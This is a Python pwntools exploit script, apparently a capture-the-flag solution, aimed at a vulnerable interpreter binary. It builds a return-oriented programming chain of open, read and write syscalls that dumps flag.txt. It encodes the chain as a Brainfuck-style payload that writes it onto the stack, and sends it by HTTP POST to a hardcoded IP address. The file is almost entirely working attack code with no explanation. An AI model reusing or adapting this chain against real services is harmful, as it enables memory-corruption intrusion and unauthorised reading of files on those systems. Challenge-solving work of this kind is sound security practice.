#!/usr/bin/env python3

from pwn import *
import requests

exe = ELF("interpreter_patched")

context.binary = exe


def p(addr):
    return p64(addr)[0:3]

def main():

    pop_rdi = 0x480522
    pop_rsi = 0x0000000000402a38
    pop_rdx_rbx = 0x000000000049184b
    pop_rdi_rbp = 0x0000000000412113
    pop_r14_r15 = 0x0000000000402854 #0x4018d7
    pop_4 = 0x0000000000411a6b
    pop_3 = 0x411a6d
    pop_1 = 0x411a71
    pop_2 = 0x411a6f
    deref_rdi_rdx  = 0x456430
    pop_rax = 0x48503b
    syscall_ret = 0x497e69
    pop_rax_rdx_rbx = 0x000000000049184a
    add_rsp_0x70 = 0x471f7a
    path = b"flag.txt"
    path_addr = 0x4e2310 
    
    ROP  = p(pop_rdx_rbx)
    ROP += b"flag.txt"
    ROP += p(pop_4)
    ROP += p(pop_3) # pop 3 times
    ROP += p(pop_rdi_rbp)
    ROP += p(path_addr)
    ROP += p(deref_rdi_rdx)
    ROP += p(pop_rdx_rbx)
    ROP += p(pop_1)
    ROP += p(pop_rax)
    ROP += p8(2)
    ROP += p(syscall_ret)
    ROP += p(pop_2)

    ROP += p(pop_rax_rdx_rbx)
    ROP += p8(0x7e)
    ROP += p(pop_rdi)
    ROP += p8(0x3)
    ROP += p(pop_rsi)
    ROP += p(exe.sym['buffer'])
    ROP += p(syscall_ret)
    ROP += p(pop_rax)
    ROP += p8(0x1)
    ROP += p(add_rsp_0x70)
    ROP += p(pop_rdi+1)
    ROP += p(pop_rdi)
    ROP += p8(0x1)
    ROP += p(syscall_ret)
    
    ROP += p(pop_rdi)
    ROP += p(pop_rax)
    ROP += p8(0x3c)
    ROP += p(pop_rdi)
    ROP += p(syscall_ret)
    
    three_b = b",>,>,>>>>>>"
    one_b = b"," + b">"*8
    jump = b">"*8

    # trying open
    payload  = b">"*0x78 + three_b + b",>"*8 + jump # flag.txt
    payload += three_b + jump*4 # p(pop4)
    payload += three_b + jump*3 # pop 3 times
    payload += three_b*2 + jump # pop rdi rbp
    payload += three_b          # deref rdi rdx
    payload += three_b + jump*2 # pop rdx rbx
    payload += three_b + jump # pop only 1
    payload += three_b + one_b # pop rax
    payload += three_b  # syscall
    payload += three_b + jump*2 # pop 2 
    payload += three_b + jump + one_b + jump # pop rax
    payload += three_b + one_b # pop rdi
    payload += three_b + three_b # pop rsi
    payload += three_b # syscall
    payload += three_b + one_b # pop rax 0
    payload += three_b # jump forward
    payload += b">"*0xd8
    payload += three_b
    payload += three_b + one_b
    payload += three_b
    payload += three_b + jump
    payload += three_b + one_b
    payload += three_b + jump
    payload += three_b


    data = ROP
    
    url = "http://40.71.72.198:8080/"
    files = {'file': open("example.png","rb").read()}
    data = {'text':data}

    r = requests.post(url, files=files, data=data)
    print(r.text)
    


if __name__ == "__main__":
    main()
